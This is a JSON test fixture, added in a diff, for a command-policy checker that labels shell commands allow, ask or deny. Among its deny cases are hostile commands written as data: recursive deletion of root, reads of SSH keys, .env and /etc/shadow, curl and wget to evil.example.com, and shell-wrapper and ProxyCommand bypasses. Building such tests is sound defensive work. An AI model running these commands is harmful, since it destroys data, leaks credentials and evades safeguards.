@@ -1,0 +1,284 @@
+{
+  "policy": "samples_policy.yaml",
+  "samples": [
+    {
+      "id": "s01",
+      "name": "safe go test",
+      "group": "safe",
+      "type": "safe",
+      "command": "go test ./...",
+      "backend": "workspaceexec",
+      "expected": "allow",
+      "expected_risk": "low"
+    },
+    {
+      "id": "s02",
+      "name": "dangerous recursive delete",
+      "group": "high_risk",
+      "type": "delete",
+      "command": "rm -rf /",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "critical",
+      "expect_rule": "dangerous_cmd_001"
+    },
+    {
+      "id": "s03",
+      "name": "dangerous force delete of root",
+      "group": "high_risk",
+      "type": "delete",
+      "command": "rm --recursive --force /",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "critical",
+      "expect_rule": "dangerous_cmd_001"
+    },
+    {
+      "id": "s04",
+      "name": "read ssh private key",
+      "group": "high_risk",
+      "type": "secret",
+      "command": "cat ~/.ssh/id_rsa",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "critical",
+      "expect_rule": "secrets_001"
+    },
+    {
+      "id": "s05",
+      "name": "read .env credentials",
+      "group": "high_risk",
+      "type": "secret",
+      "command": "cat .env",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "critical",
+      "expect_rule": "secrets_001"
+    },
+    {
+      "id": "s06",
+      "name": "curl to non-allowlisted host",
+      "group": "high_risk",
+      "type": "network",
+      "command": "curl https://evil.example.com/data",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "high",
+      "expect_rule": "non_allowlisted_host"
+    },
+    {
+      "id": "s07",
+      "name": "wget to non-allowlisted host",
+      "group": "high_risk",
+      "type": "network",
+      "command": "wget http://evil.example.com/x",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "high",
+      "expect_rule": "non_allowlisted_host"
+    },
+    {
+      "id": "s08",
+      "name": "sftp to non-allowlisted host",
+      "group": "high_risk",
+      "type": "network",
+      "command": "sftp evil.example.com",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "high",
+      "expect_rule": "non_allowlisted_host"
+    },
+    {
+      "id": "s09",
+      "name": "sh -c shell wrapper bypass",
+      "group": "high_risk",
+      "type": "shell_bypass",
+      "command": "sh -c 'echo hacked'",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "critical",
+      "expect_rule": "shell_bypass_001"
+    },
+    {
+      "id": "s10",
+      "name": "piped shell bypass",
+      "group": "high_risk",
+      "type": "pipeline",
+      "command": "echo 'hello' | bash -c 'cat /etc/passwd'",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "critical",
+      "expect_rule": "shell_bypass_001"
+    },
+    {
+      "id": "s11",
+      "name": "dependency install",
+      "group": "high_risk",
+      "type": "dependency",
+      "command": "pip install malicious-package",
+      "backend": "workspaceexec",
+      "expected": "ask",
+      "expected_risk": "medium",
+      "expect_rule": "dependency_install_001"
+    },
+    {
+      "id": "s12",
+      "name": "long-running sleep",
+      "group": "high_risk",
+      "type": "long_run",
+      "command": "sleep 9999",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "high",
+      "expect_rule": "resource_abuse_001"
+    },
+    {
+      "id": "s13",
+      "name": "unbounded output stream",
+      "group": "high_risk",
+      "type": "output_flood",
+      "command": "cat /dev/zero",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "critical",
+      "expect_rule": "output_flood"
+    },
+    {
+      "id": "s14",
+      "name": "hostexec long session",
+      "group": "high_risk",
+      "type": "hostexec",
+      "command": "tail -f /var/log/app.log",
+      "backend": "hostexec",
+      "expected": "ask",
+      "expected_risk": "high",
+      "expect_rule": "hostexec_long_session"
+    },
+    {
+      "id": "s15",
+      "name": "curl to non-allowlisted host denied",
+      "group": "high_risk",
+      "type": "network",
+      "command": "curl -X POST https://unknown-api.example/data",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "high",
+      "expect_rule": "non_allowlisted_host"
+    },
+    {
+      "id": "s16",
+      "name": "ssh hidden command option",
+      "group": "high_risk",
+      "type": "shell_bypass",
+      "command": "ssh -oProxyCommand=evilprog github.com",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "critical",
+      "expect_rule": "net_command_option"
+    },
+    {
+      "id": "s17",
+      "name": "tilde traversal to /etc/shadow",
+      "group": "high_risk",
+      "type": "secret",
+      "command": "cat ~root/../etc/shadow",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "critical",
+      "expect_rule": "forbidden_path"
+    },
+    {
+      "id": "s18",
+      "name": "curl config file",
+      "group": "high_risk",
+      "type": "network",
+      "command": "curl -K auth.cfg https://api.github.com",
+      "backend": "workspaceexec",
+      "expected": "deny",
+      "expected_risk": "critical",
+      "expect_rule": "net_config_file"
+    },
+    {
+      "id": "s19",
+      "name": "safe echo",
+      "group": "safe",
+      "type": "safe",
+      "command": "echo hello world",
+      "backend": "workspaceexec",
+      "expected": "allow",
+      "expected_risk": "low"
+    },
+    {
+      "id": "s20",
+      "name": "safe ls",
+      "group": "safe",
+      "type": "safe",
+      "command": "ls -la",
+      "backend": "workspaceexec",
+      "expected": "allow",
+      "expected_risk": "low"
+    },
+    {
+      "id": "s21",
+      "name": "allowlisted sftp",
+      "group": "safe",
+      "type": "whitelist_network",
+      "command": "sftp github.com",
+      "backend": "workspaceexec",
+      "expected": "allow",
+      "expected_risk": "low"
+    },
+    {
+      "id": "s22",
+      "name": "allowlisted git clone",
+      "group": "safe",
+      "type": "whitelist_network",
+      "command": "git clone https://github.com/repo",
+      "backend": "workspaceexec",
+      "expected": "allow",
+      "expected_risk": "low"
+    },
+    {
+      "id": "s23",
+      "name": "in-home traversal",
+      "group": "safe",
+      "type": "safe",
+      "command": "cat ~/notes/../todo.txt",
+      "backend": "workspaceexec",
+      "expected": "allow",
+      "expected_risk": "low"
+    },
+    {
+      "id": "s24",
+      "name": "multi-line safe script",
+      "group": "safe",
+      "type": "safe",
+      "command": "echo hello\ncat /tmp/x\nls -la",
+      "backend": "workspaceexec",
+      "expected": "allow",
+      "expected_risk": "low"
+    },
+    {
+      "id": "s25",
+      "name": "500-segment benchmark script",
+      "group": "benchmark",
+      "type": "benchmark",
+      "command": "echo a\nls -la\ngrep foo /tmp/x\nmkdir -p /tmp/y\ncat /tmp/z\n",
+      "repeat": 100,
+      "backend": "workspaceexec",
+      "expected": "allow",
+      "expected_risk": "low"
+    },
+    {
+      "id": "s26",
+      "name": "npm dependency install (ask)",
+      "group": "high_risk",
+      "type": "ask",
+      "command": "npm install express",
+      "backend": "workspaceexec",
+      "expected": "ask",
+      "expected_risk": "medium",
+      "expect_rule": "dependency_install_001"
+    }
+  ]
+}
